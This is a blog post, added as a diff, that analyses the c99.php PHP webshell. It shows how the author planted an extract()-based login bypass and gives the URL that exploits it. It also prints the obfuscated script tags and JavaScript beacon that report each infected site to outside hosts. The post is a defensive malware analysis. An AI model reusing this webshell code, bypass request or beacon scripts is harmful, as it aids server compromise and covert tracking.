@@ -1,0 +1,199 @@
+---
+layout: post
+title: "c99.php : A backdoor backdoored"
+lang: en
+categories:
+  - security
+tags:
+  - security
+  - backdoor
+  - webshell
+  - php
+date: 2016/04/19
+thumbnail: /images/security-265130_640.jpg
+---
+C99 is a PHP webshell. Attackers uploads it on web server in order to get informations and above all execute commands with web user privileges (ex: www-data).
+
+This webshell is protected by a customizable password, so interface access is limited to people who know the password.
+
+But the password verification mechanism is vulnerable ... in fact the flaw was deliberately inserted into the code to permit the webshell author to bypass it.
+
+## Code
+
+```php
+[...]
+
+//Authentication
+$login = ""; //login
+//DON'T FORGOT ABOUT PASSWORD!!!
+$pass = ""; //password
+$md5_pass = ""; //md5-cryped pass. if null, md5($pass)
+
+[...]
+
+@$f = $_REQUEST["f"];
+@extract($_REQUEST["c999shcook"]);
+
+//END CONFIGURATION
+
+
+// \/Next code isn't for editing\/
+@set_time_limit(0);
+$tmp = array();
+foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
+$s = "!^(".implode("|",$tmp).")$!i";
+if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/cc999shell\">c999shell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
+if (!empty($login))
+{
+ if (empty($md5_pass)) {$md5_pass = md5($pass);}
+ if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
+ {
+  if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|<br>"," ",$donated_html));}
+  header("WWW-Authenticate: Basic realm=\"c999shell ".$shver.": ".$login_txt."\"");
+  header("HTTP/1.0 401 Unauthorized");
+  exit($accessdeniedmess);
+ }
+}
+
+[...]
+```
+
+## Vulnerability
+
+Username and password are hardcoded to be easily editable.
+```php
+//Authentication
+$login = ""; //login
+//DON'T FORGOT ABOUT PASSWORD!!!
+$pass = ""; //password
+$md5_pass = ""; //md5-cryped pass. if null, md5($pass)
+```
+
+Next, login and password are checked by the following code:
+```php
+if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
+```
+
+If login and password are not correct, an error page indicate that access is forbidden.
+
+But checking is processed only if login is not empty: `if (!empty($login))`.
+
+`$login` is normally initialized staticly at the begining but after that the variable can be modified by `extract()` function :
+```php
+@extract($_REQUEST["c999shcook"]);
+```
+
+## extract() function
+
+PHP documentation say :
+
+>extract
+>
+>(PHP 4, PHP 5, PHP 7)
+>
+>extract — Import variables into the current symbol table from an array
+>Description
+>Import variables from an array into the current symbol table.
+>
+>Checks each key to see whether it has a valid variable name. It also checks for collisions with existing variables in the symbol table.
+
+```php 
+int extract ( array &$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )
+```
+
+`extract()` is mostly used to initialize variables from an array.
+
+For example:
+```php
+
+<?php
+
+$var_array = array("color" => "blue",
+                   "size"  => "medium",
+                   "shape" => "sphere");
+extract($var_array);
+
+echo "$color, $size, $shape\n";
+
+?>
+```
+will output:
+```php
+blue, medium, sphere
+```
+
+So for each line of the array, the key becomes the variable name and the value is given to the variable.
+
+This function is dangerous because of it default behaviour : if a key of the extracted array match with an existant variable, the variable value will be replaced by the value of the array given in paramteter to extract().
+
+{% alert info %}
+To develop a secure software, never use extract() with unknown data or user's data (ex: prompt).
+
+There are flags (ex: EXTR_SKIP) to protect already existing variable.
+{% endalert %}
+
+## Exploit
+
+Bypass authentification is very simple : overwrite `$login` variable.
+```php
+http://url.com/c99.php?c999shcook[login]=0
+```
+
+It's possible because of:
+```php
+@extract($_REQUEST["c999shcook"]);
+```
+
+## Why a backdoor?
+
+Pirates infect websites with webshells, but because this webshell is backdoored other pirates (authors of the webshell) will be able to control the server too.
+
+`extract()` function and `c999shcook` array are useless for the webshell but allow to overwrite any variables in the PHP script.
+
+## There is another flaw
+
+{% alert warning %}
+There is a lot of c99.php variant: c99, c999, c99shell, c99unlimited, ... so some differences may occure.
+
+There is multiple version of each variant and each variant can be declined in multiple forms: php, txt, jpg, ...
+{% endalert %}
+
+The simplest versions of c99 include a clear script:
+```html
+<script src=http://www.r57.gen.tr/yazciz/ciz.js></script>
+```
+
+Others like c99-bd try to poorly obfuscate it:
+```html
+<SCRIPT SRC=&#x68&#fthfthfjgyk&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x70&#x72&#x69&#x76&#x63&#x30&#x64&#x65&#x2e&#x63&#x6f&#x6d&#x2f&#x69&#x6d&#x61&#x67&#x65&#x73&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
+```
+But a simple HTML decoder will decode `http://www.privc0de.com/images/yaz.js`.
+
+Others like c100, r57, c999 or updated c99 version have more sophisticated method like packing the script:
+```javascript
+<script type="text/javascript">
+if(typeof btoa=="undefined")btoa=function(a,b){b=(typeof b=='undefined')?false:b;var d,o2,o3,bits,h1,h2,h3,h4,e=[],pad='',c,plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";plain=b?Utf8.encode(a):a;c=plain.length%3;if(c>0){while(c++<3){pad+='=';plain+='\0'}}for(c=0;c<plain.length;c+=3){d=plain.charCodeAt(c);o2=plain.charCodeAt(c+1);o3=plain.charCodeAt(c+2);bits=d<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;e[c/3]=f.charAt(h1)+f.charAt(h2)+f.charAt(h3)+f.charAt(h4)}coded=e.join('');coded=coded.slice(0,coded.length-pad.length)+pad;return coded};if(typeof atob=="undefined")atob=function(a,b){b=(typeof b=='undefined')?false:b;var e,o2,o3,h1,h2,h3,h4,bits,d=[],plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";coded=b?Utf8.decode(a):a;for(var c=0;c<coded.length;c+=4){h1=f.indexOf(coded.charAt(c));h2=f.indexOf(coded.charAt(c+1));h3=f.indexOf(coded.charAt(c+2));h4=f.indexOf(coded.charAt(c+3));bits=h1<<18|h2<<12|h3<<6|h4;e=bits>>>16&0xff;o2=bits>>>8&0xff;o3=bits&0xff;d[c/4]=String.fromCharCode(e,o2,o3);if(h4==0x40)d[c/4]=String.fromCharCode(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)}plain=d.join('');return b?Utf8.decode(plain):plain};
+setTimeout(function(){new Function(atob(atob(document.getElementById('ghdescon').src.substr(22)).match(/ghdescon(.*?)ghdescon/)[1])).apply(this);kk(1);}, 500);
+</script>
+```
+and unpack code can be a lot more complex than only base64_decode it or hex_to_ascii it.
+
+The goal is always the same : each time the page is displayed, the website hosting the webshell will do a request to the malicious address and send the URL where it comes from, permiting to the malicious author to know all the website hosting the backdoored webshell.
+
+The malicious script from `http://www.r57.gen.tr/yazciz/ciz.js` looks like this:
+```javascript
+a=new/**/Image();a.src='http://www.r57.gen.tr/r00t/yaz.php?a='+escape(location.href);
+```
+
+Script kiddies, lamers, and inattentive pirates will use webshells without looking carefully at the code.
+The combo *flaw* + *inventory of infected website* is an easy way, for webshells' authors, to control a network of server (ex: creating a botnet) by letting to others the system corruption task.
+
+More sophisticated piracy tools have some vulnerabilities too. Malwares like Smoke Loader (SQL injection), CrimePack (SQL injection) or Zeus (remote access via upload) have been corrupted.
+
+## Warning
+
+When using tools, be carefull, backdoors may be hidden. Pay attention to images, scripts, css, external request, mail functions, encoded code, ...
+
+
+
+Source: *[C99.php : Quand même les backdoors sont backdoorées](https://www.lexsi.com/securityhub/c99-php-meme-les-backdoors-backdoorees/)* by **Hugo Ballesteros**
